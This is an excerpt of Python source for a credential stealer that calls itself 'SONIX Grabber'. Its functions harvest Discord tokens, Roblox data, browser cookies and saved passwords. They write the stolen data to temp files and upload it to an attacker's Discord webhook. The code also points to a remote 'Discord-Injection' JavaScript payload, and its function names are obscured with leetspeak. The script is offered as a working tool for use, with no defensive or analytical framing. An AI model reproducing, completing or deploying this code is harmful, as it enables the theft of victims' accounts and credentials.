...
hook = "HOOK HERE"
inj3c710n_url = "https://github.com/SoulOnToq/Discord-Injection/raw/refs/heads/main/index.js"
color =  0x000875
DETECTED = False
...
def UP104D70K3N(token, path):
    ...
    data = {
        ...
        "embeds": [
            ...
            "footer": {
                "text": "SONIX Grabber",
                "icon_url": "https://cdn.discordapp.com/attachments/1263416039899795557/1294993987198783529/download.jpg?ex=670d08a2&is=670bb722&hm=620580d606e03be4db97b62afbdcafc6734e2285dc2ad0fd50e6467913c89b17&"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
        ...
        "avatar_url": "https://cdn.discordapp.com/attachments/1263416039899795557/1294993987198783529/download.jpg?ex=670d08a2&is=670bb722&hm=620580d606e03be4db97b62afbdcafc6734e2285dc2ad0fd50e6467913c89b17&",
        "username": "SONIX Grabber",
        "attachments": []
        }
...
data = {
            ...
            "embeds": [
                {
                    "title": "SONIX Grabber | Roblox Information",
...
def UP104D(name, link):
    ...
    if name == "Sxcook":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "SONIX Grabber | Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [SNXCookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "SONIX Grabber | Thank you for using premium.",
                        "icon_url": "https://cdn.discordapp.com/attachments/1263416039899795557/1294993987198783529/download.jpg?ex=670d08a2&is=670bb722&hm=620580d606e03be4db97b62afbdcafc6734e2285dc2ad0fd50e6467913c89b17&"
    ...
    if name == "Sxpassw":
        ...
        data = {
            ...
            "embeds": [
                {
                    "title": "SONIX Grabber | Passwords",
                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [SNXPasswords.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "SONIX Grabber",
                        "icon_url": "https://cdn.discordapp.com/attachments/1263416039899795557/1294993987198783529/download.jpg?ex=670d08a2&is=670bb722&hm=620580d606e03be4db97b62afbdcafc6734e2285dc2ad0fd50e6467913c89b17&"
...
def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\Sx{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"<--SONIXGrabber-->\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")
...
def g37P455W(path, arg):
    ...
    tempfold = temp + "Sx" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
...
def G47H3r411():
    ...
    for file in ["Sxpassw.txt", "Sxcook.txt"]: 
